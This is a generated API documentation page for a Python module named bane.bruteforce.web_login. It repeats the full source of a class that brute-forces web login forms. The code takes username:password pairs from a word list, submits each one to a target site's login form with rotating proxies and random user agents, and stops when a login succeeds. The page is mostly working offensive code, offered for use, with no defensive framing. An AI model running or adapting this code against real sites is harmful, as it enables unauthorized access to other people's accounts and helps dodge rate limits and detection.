<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>bane.bruteforce.web_login</code></h1>
</header>
<section id="section-intro">
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">from bane.bruteforce.utils import *



class web_login_bruteforce:
    __slots__ = [&#34;stop&#34;, &#34;finish&#34;, &#34;result&#34;, &#34;logs&#34;]

    def try_combo(self, url, username, password, cookie, user_agent, proxy, timeout,headers):
        prox = None
        cookies = None
        h = {&#34;User-Agent&#34;: user_agent}
        if cookie:
            h.update({&#34;Cookie&#34;: cookie})
            cookies = cookie
        h.update(headers)
        try:
            r = requests.Session().get(
                url, proxies=proxy, headers=h, verify=False, timeout=timeout
            )
        except:
            return False
        cook = None
        try:
            cook = r.headers[&#34;Set-cookie&#34;]
        except:
            pass
        cookies = set_correct_cookies(cook, cookie=cookie)
        form = set_login_form(url, r.text, username, password)
        h = {&#34;User-Agent&#34;: user_agent}
        if cookies:
            h.update({&#34;Cookie&#34;: cookies})
        d = form[0]
        h.update(
            {
                &#34;Referer&#34;: form[1],
                &#34;Origin&#34;: form[1].split(&#34;://&#34;)[0]
                + &#34;://&#34;
                + form[1].split(&#34;://&#34;)[1].split(&#34;/&#34;)[0],
            }
        )
        try:
            r = requests.Session().post(
                form[1], data=d, headers=h, verify=False, proxies=proxy, timeout=timeout
            )
        except:
            return False
        try:
            set_login_form(url, r.text, username, password)
            return False
        except:
            return True

    def __init__(
        self,
        u,
        word_list=[],
        threads_daemon=True,
        logs=True,
        proxy=None,
        proxies=None,
        cookie=None,
        user_agent=None,
        timeout=10,
        headers={}
    ):
        self.stop = False
        self.finish = False
        self.logs = logs
        self.result = {}
        t = threading.Thread(
            target=self.crack,
            args=(
                u,
                word_list,
                logs,
                proxy,
                proxies,
                cookie,
                user_agent,
                timeout,
                headers,
            ),
        )
        t.daemon = threads_daemon
        t.start()

    def done(self):
        return self.finish

    def crack(self, u, word_list, logs, proxy, proxies, cookie, user_agent, timeout,headers):
        for x in word_list:
            try:
                if self.stop == True:
                    self.finish = True
                    break
                username = x.split(&#34;:&#34;)[0]
                password = x.split(&#34;:&#34;)[1]
                if self.logs == True:
                    print(&#34;[*]Trying: {} {}&#34;.format(username, password))
                if user_agent:
                    us = user_agent
                else:
                    us = random.choice(ua)
                prox = None
                if proxy:
                    prox = proxy
                if proxies:
                    prox = random.choice(proxies)
                if (
                    self.try_combo(u, username, password, cookie, us, prox, timeout,headers)
                    == True
                ):
                    if self.logs == True:
                        print(&#34;[+]Success&#34;)
                    self.result = {u: username + &#34;:&#34; + password}
                    self.finish = True
                    break
                else:
                    if self.logs == True:
                        print(&#34;[-]Fail&#34;)
            except Exception as e:
                pass
                if self.logs == True:
                    print(&#34;[-]Fail&#34;)
        self.finish = True</code></pre>
</details>
</section>
<section>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-classes">Classes</h2>
<dl>
<dt id="bane.bruteforce.web_login.web_login_bruteforce"><code class="flex name class">
<span>class <span class="ident">web_login_bruteforce</span></span>
<span>(</span><span>u, word_list=[], threads_daemon=True, logs=True, proxy=None, proxies=None, cookie=None, user_agent=None, timeout=10, headers={})</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class web_login_bruteforce:
    __slots__ = [&#34;stop&#34;, &#34;finish&#34;, &#34;result&#34;, &#34;logs&#34;]

    def try_combo(self, url, username, password, cookie, user_agent, proxy, timeout,headers):
        prox = None
        cookies = None
        h = {&#34;User-Agent&#34;: user_agent}
        if cookie:
            h.update({&#34;Cookie&#34;: cookie})
            cookies = cookie
        h.update(headers)
        try:
            r = requests.Session().get(
                url, proxies=proxy, headers=h, verify=False, timeout=timeout
            )
        except:
            return False
        cook = None
        try:
            cook = r.headers[&#34;Set-cookie&#34;]
        except:
            pass
        cookies = set_correct_cookies(cook, cookie=cookie)
        form = set_login_form(url, r.text, username, password)
        h = {&#34;User-Agent&#34;: user_agent}
        if cookies:
            h.update({&#34;Cookie&#34;: cookies})
        d = form[0]
        h.update(
            {
                &#34;Referer&#34;: form[1],
                &#34;Origin&#34;: form[1].split(&#34;://&#34;)[0]
                + &#34;://&#34;
                + form[1].split(&#34;://&#34;)[1].split(&#34;/&#34;)[0],
            }
        )
        try:
            r = requests.Session().post(
                form[1], data=d, headers=h, verify=False, proxies=proxy, timeout=timeout
            )
        except:
            return False
        try:
            set_login_form(url, r.text, username, password)
            return False
        except:
            return True

    def __init__(
        self,
        u,
        word_list=[],
        threads_daemon=True,
        logs=True,
        proxy=None,
        proxies=None,
        cookie=None,
        user_agent=None,
        timeout=10,
        headers={}
    ):
        self.stop = False
        self.finish = False
        self.logs = logs
        self.result = {}
        t = threading.Thread(
            target=self.crack,
            args=(
                u,
                word_list,
                logs,
                proxy,
                proxies,
                cookie,
                user_agent,
                timeout,
                headers,
            ),
        )
        t.daemon = threads_daemon
        t.start()

    def done(self):
        return self.finish

    def crack(self, u, word_list, logs, proxy, proxies, cookie, user_agent, timeout,headers):
        for x in word_list:
            try:
                if self.stop == True:
                    self.finish = True
                    break
                username = x.split(&#34;:&#34;)[0]
                password = x.split(&#34;:&#34;)[1]
                if self.logs == True:
                    print(&#34;[*]Trying: {} {}&#34;.format(username, password))
                if user_agent:
                    us = user_agent
                else:
                    us = random.choice(ua)
                prox = None
                if proxy:
                    prox = proxy
                if proxies:
                    prox = random.choice(proxies)
                if (
                    self.try_combo(u, username, password, cookie, us, prox, timeout,headers)
                    == True
                ):
                    if self.logs == True:
                        print(&#34;[+]Success&#34;)
                    self.result = {u: username + &#34;:&#34; + password}
                    self.finish = True
                    break
                else:
                    if self.logs == True:
                        print(&#34;[-]Fail&#34;)
            except Exception as e:
                pass
                if self.logs == True:
                    print(&#34;[-]Fail&#34;)
        self.finish = True</code></pre>
</details>
<h3>Instance variables</h3>
<dl>
<dt id="bane.bruteforce.web_login.web_login_bruteforce.finish"><code class="name">var <span class="ident">finish</span></code></dt>
<dd>
<div class="desc"><p>Return an attribute of instance, which is of type owner.</p></div>
</dd>
<dt id="bane.bruteforce.web_login.web_login_bruteforce.logs"><code class="name">var <span class="ident">logs</span></code></dt>
<dd>
<div class="desc"><p>Return an attribute of instance, which is of type owner.</p></div>
</dd>
<dt id="bane.bruteforce.web_login.web_login_bruteforce.result"><code class="name">var <span class="ident">result</span></code></dt>
<dd>
<div class="desc"><p>Return an attribute of instance, which is of type owner.</p></div>
</dd>
<dt id="bane.bruteforce.web_login.web_login_bruteforce.stop"><code class="name">var <span class="ident">stop</span></code></dt>
<dd>
<div class="desc"><p>Return an attribute of instance, which is of type owner.</p></div>
</dd>
</dl>
<h3>Methods</h3>
<dl>
<dt id="bane.bruteforce.web_login.web_login_bruteforce.crack"><code class="name flex">
<span>def <span class="ident">crack</span></span>(<span>self, u, word_list, logs, proxy, proxies, cookie, user_agent, timeout, headers)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def crack(self, u, word_list, logs, proxy, proxies, cookie, user_agent, timeout,headers):
    for x in word_list:
        try:
            if self.stop == True:
                self.finish = True
                break
            username = x.split(&#34;:&#34;)[0]
            password = x.split(&#34;:&#34;)[1]
            if self.logs == True:
                print(&#34;[*]Trying: {} {}&#34;.format(username, password))
            if user_agent:
                us = user_agent
            else:
                us = random.choice(ua)
            prox = None
            if proxy:
                prox = proxy
            if proxies:
                prox = random.choice(proxies)
            if (
                self.try_combo(u, username, password, cookie, us, prox, timeout,headers)
                == True
            ):
                if self.logs == True:
                    print(&#34;[+]Success&#34;)
                self.result = {u: username + &#34;:&#34; + password}
                self.finish = True
                break
            else:
                if self.logs == True:
                    print(&#34;[-]Fail&#34;)
        except Exception as e:
            pass
            if self.logs == True:
                print(&#34;[-]Fail&#34;)
    self.finish = True</code></pre>
</details>
</dd>
<dt id="bane.bruteforce.web_login.web_login_bruteforce.done"><code class="name flex">
<span>def <span class="ident">done</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def done(self):
    return self.finish</code></pre>
</details>
</dd>
<dt id="bane.bruteforce.web_login.web_login_bruteforce.try_combo"><code class="name flex">
<span>def <span class="ident">try_combo</span></span>(<span>self, url, username, password, cookie, user_agent, proxy, timeout, headers)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def try_combo(self, url, username, password, cookie, user_agent, proxy, timeout,headers):
    prox = None
    cookies = None
    h = {&#34;User-Agent&#34;: user_agent}
    if cookie:
        h.update({&#34;Cookie&#34;: cookie})
        cookies = cookie
    h.update(headers)
    try:
        r = requests.Session().get(
            url, proxies=proxy, headers=h, verify=False, timeout=timeout
        )
    except:
        return False
    cook = None
    try:
        cook = r.headers[&#34;Set-cookie&#34;]
    except:
        pass
    cookies = set_correct_cookies(cook, cookie=cookie)
    form = set_login_form(url, r.text, username, password)
    h = {&#34;User-Agent&#34;: user_agent}
    if cookies:
        h.update({&#34;Cookie&#34;: cookies})
    d = form[0]
    h.update(
        {
            &#34;Referer&#34;: form[1],
            &#34;Origin&#34;: form[1].split(&#34;://&#34;)[0]
            + &#34;://&#34;
            + form[1].split(&#34;://&#34;)[1].split(&#34;/&#34;)[0],
        }
    )
    try:
        r = requests.Session().post(
            form[1], data=d, headers=h, verify=False, proxies=proxy, timeout=timeout
        )
    except:
        return False
    try:
        set_login_form(url, r.text, username, password)
        return False
    except:
        return True</code></pre>
</details>
</dd>
</dl>
</dd>
</dl>
</section>
</article>
<nav id="sidebar">
<h1>Index</h1>
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a title="bane.bruteforce" href="index.md">bane.bruteforce</a></code></li>
</ul>
</li>
<li><h3><a href="#header-classes">Classes</a></h3>
<ul>
<li>
<h4><code><a title="bane.bruteforce.web_login.web_login_bruteforce" href="#bane.bruteforce.web_login.web_login_bruteforce">web_login_bruteforce</a></code></h4>
<ul class="two-column">
<li><code><a title="bane.bruteforce.web_login.web_login_bruteforce.crack" href="#bane.bruteforce.web_login.web_login_bruteforce.crack">crack</a></code></li>
<li><code><a title="bane.bruteforce.web_login.web_login_bruteforce.done" href="#bane.bruteforce.web_login.web_login_bruteforce.done">done</a></code></li>
<li><code><a title="bane.bruteforce.web_login.web_login_bruteforce.finish" href="#bane.bruteforce.web_login.web_login_bruteforce.finish">finish</a></code></li>
<li><code><a title="bane.bruteforce.web_login.web_login_bruteforce.logs" href="#bane.bruteforce.web_login.web_login_bruteforce.logs">logs</a></code></li>
<li><code><a title="bane.bruteforce.web_login.web_login_bruteforce.result" href="#bane.bruteforce.web_login.web_login_bruteforce.result">result</a></code></li>
<li><code><a title="bane.bruteforce.web_login.web_login_bruteforce.stop" href="#bane.bruteforce.web_login.web_login_bruteforce.stop">stop</a></code></li>
<li><code><a title="bane.bruteforce.web_login.web_login_bruteforce.try_combo" href="#bane.bruteforce.web_login.web_login_bruteforce.try_combo">try_combo</a></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.</p>
</footer>
</body>
</html>